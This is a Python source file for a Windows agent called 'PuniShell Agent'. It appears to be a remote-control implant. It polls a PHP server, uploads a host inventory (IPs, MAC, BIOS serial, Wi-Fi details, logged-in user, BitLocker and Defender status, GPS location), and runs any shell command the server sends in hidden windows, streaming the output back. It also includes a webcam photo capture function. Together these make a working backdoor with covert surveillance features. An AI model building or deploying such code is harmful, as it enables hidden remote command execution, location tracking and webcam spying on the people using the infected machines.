import socket
import subprocess
import time
import json
import urllib.request
import urllib.parse
import uuid
import platform
import shutil
import ctypes
import cv2 
import base64 
import requests 

class PunishellAgent:
    def __init__(self, api_url, report_url):
        self.api_url = api_url
        self.report_url = report_url
        self.poll_interval = 10 
        
    def get_hostname(self): return socket.gethostname()

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception: return "127.0.0.1"

    def get_public_ip(self):
        try: return urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode('utf8')
        except Exception: return "UNKNOWN"

    def get_mac_address(self):
        mac = uuid.getnode()
        return ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2)).upper()

    def get_bios_serial(self):
        try:
            cmd = ["powershell", "-NoProfile", "-Command", "(Get-CimInstance -ClassName Win32_BIOS).SerialNumber"]
            output = subprocess.check_output(cmd, creationflags=subprocess.CREATE_NO_WINDOW, text=True).strip()
            return output if output else "UNKNOWN"
        except Exception: return "UNKNOWN"

    def get_wifi_info(self):
        ssid, bssid = "LAN/UNKNOWN", "N/A"
        try:
            out = subprocess.check_output("netsh wlan show interfaces", shell=True, creationflags=subprocess.CREATE_NO_WINDOW, text=True)
            for line in out.split('\n'):
                if " SSID " in line: ssid = line.split(":")[1].strip()
                elif " BSSID " in line: bssid = line.split(":")[1].strip()
        except Exception: pass
        return ssid, bssid

    def get_logged_user(self):
        try:
            cmd = ["powershell", "-NoProfile", "-Command", "(Get-CimInstance Win32_ComputerSystem).UserName"]
            output = subprocess.check_output(cmd, creationflags=subprocess.CREATE_NO_WINDOW, text=True).strip()
            return output.split("\\")[-1] if "\\" in output else output
        except Exception: return "UNKNOWN"

    def get_os_info(self): return f"{platform.system()} {platform.release()}"

    def get_uptime_hours(self):
        try:
            t = ctypes.windll.kernel32.GetTickCount64()
            return round(t / 1000 / 3600, 2)
        except Exception: return 0.0

    def get_disk_free_gb(self):
        try:
            _, _, free = shutil.disk_usage("C:\\")
            return round(free / (1024**3), 2)
        except Exception: return 0.0

    def get_ram_gb(self):
        try:
            cmd = ["powershell", "-NoProfile", "-Command", "[Math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB)"]
            return int(subprocess.check_output(cmd, creationflags=subprocess.CREATE_NO_WINDOW, text=True).strip())
        except Exception: return 0

    def get_security_status(self):
        bitlocker, defender = "UNKNOWN", "UNKNOWN"
        try:
            bl_cmd = ["powershell", "-NoProfile", "-Command", "(Get-BitLockerVolume -MountPoint C:).VolumeStatus"]
            bitlocker = subprocess.check_output(bl_cmd, creationflags=subprocess.CREATE_NO_WINDOW, text=True).strip() or "Unencrypted"
            df_cmd = ["powershell", "-NoProfile", "-Command", "(Get-MpComputerStatus).AMServiceEnabled"]
            defender_raw = subprocess.check_output(df_cmd, creationflags=subprocess.CREATE_NO_WINDOW, text=True).strip()
            defender = "Enabled" if defender_raw == "True" else "Disabled"
        except Exception: pass
        return bitlocker, defender

    def get_windows_location(self):
        ps_script = 'Add-Type -AssemblyName System.Device; $watcher = New-Object System.Device.Location.GeoCoordinateWatcher; $watcher.Start(); Start-Sleep -Seconds 2; if ($watcher.Position.Location.IsUnknown -eq $false) { $pos = $watcher.Position.Location; Write-Output "$($pos.Latitude),$($pos.Longitude)" } else { Write-Output "UNKNOWN" }'
        try:
            output = subprocess.check_output(["powershell", "-NoProfile", "-Command", ps_script], creationflags=subprocess.CREATE_NO_WINDOW, text=True).strip()
            return output.split(",") if "," in output else ("UNKNOWN", "UNKNOWN")
        except Exception: return "UNKNOWN", "UNKNOWN"

    def capture_photo(self):
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened(): return None
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 80])
            return base64.b64encode(buffer).decode('utf-8')
        return None

    def gather_inventory(self):
        ssid, bssid = self.get_wifi_info()
        bitlocker, defender = self.get_security_status()
        lat, lon = self.get_windows_location()
        return {
            "hostname": self.get_hostname(), "local_ip": self.get_local_ip(),
            "public_ip": self.get_public_ip(), "latitude": lat, "longitude": lon,
            "mac_address": self.get_mac_address(), "bios_serial": self.get_bios_serial(),
            "ssid": ssid, "bssid": bssid, "logged_user": self.get_logged_user(),
            "os_version": self.get_os_info(), "uptime_hours": self.get_uptime_hours(),
            "disk_free_gb": self.get_disk_free_gb(), "ram_gb": self.get_ram_gb(),
            "bitlocker_status": bitlocker, "defender_status": defender
        }

    def execute_command(self, cmd_id, command_string):
        # SEGURIDAD: Si alguien intenta un ping infinito, lo limitamos a 5
        if "ping" in command_string and "-t" in command_string:
            command_string = command_string.replace("-t", "-n 5")

        print(f"[*] Ejecutando: {command_string}")
        try:
            proc = subprocess.Popen(
                command_string, shell=True, 
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, 
                text=True, bufsize=1, creationflags=subprocess.CREATE_NO_WINDOW
            )

            # Recolectamos la salida
            full_output = ""
            for line in iter(proc.stdout.readline, ""):
                if line:
                    full_output += line
                    # Enviamos la línea al servidor (Streaming)
                    requests.post(self.report_url, data={'id': cmd_id, 'output': line}, timeout=5)
            
            proc.stdout.close()
            proc.wait()

            # NOTIFICAR FIN: Muy importante para que el JS se detenga
            datos_fin = {
                'action': 'update_command', 
                'command_id': cmd_id, 
                'status': 'executed', 
                'mac_address': self.get_mac_address()
            }
            # Usamos la api_url (poll.php) para marcar como ejecutado
            requests.post(self.api_url, data=urllib.parse.urlencode(datos_fin).encode('utf-8'), headers={'Content-Type': 'application/x-www-form-urlencoded'}, timeout=10)

        except Exception as e:
            print(f"[!] Error: {e}")

    def poll_server(self):
        print(f"[*] Check-in: {self.get_hostname()}...")
        payload = json.dumps(self.gather_inventory()).encode('utf-8')
        req = urllib.request.Request(self.api_url, data=payload, headers={'Content-Type': 'application/json'}, method='POST')
        try:
            with urllib.request.urlopen(req, timeout=15) as response:
                if response.status == 200:
                    data = json.loads(response.read().decode('utf-8'))
                    
                    print(f" > RAW DATA: {data}")
                    
                    # --- LÓGICA DE TURBO (MODO PUTTY) ---
                    if data.get('terminal_live') == 1:
                        if self.poll_interval != 1:
                            print("[⚡] TÚNEL INTERACTIVO DETECTADO: Modo Turbo Activo (1s)")
                            self.poll_interval = 1 # Pregunta cada 1 segundo
                    else:
                        if self.poll_interval != 10:
                            print("[*] Modo Normal: Regresando a 10s")
                            self.poll_interval = 10 # Regresa a la normalidad
                    # ------------------------------------

                    commands = data.get('pending_commands', [])
                    for cmd in commands:
                        self.execute_command(cmd['id'], cmd['command_string'])
        except Exception as e: 
            print(f"[!] Error de conexión: {e}")

    def run(self):
        while True:
            self.poll_server()
            time.sleep(self.poll_interval)

if __name__ == "__main__":
    API_BASE = "http://localhost/backend_php/poll.php"
    REPORT_URL = "http://localhost/backend_php/reportar_resultado.php"
    print("[*] PuniShell Agent V2.5 | Easton Design IT Tactical Division")
    agent = PunishellAgent(API_BASE, REPORT_URL)
    agent.run()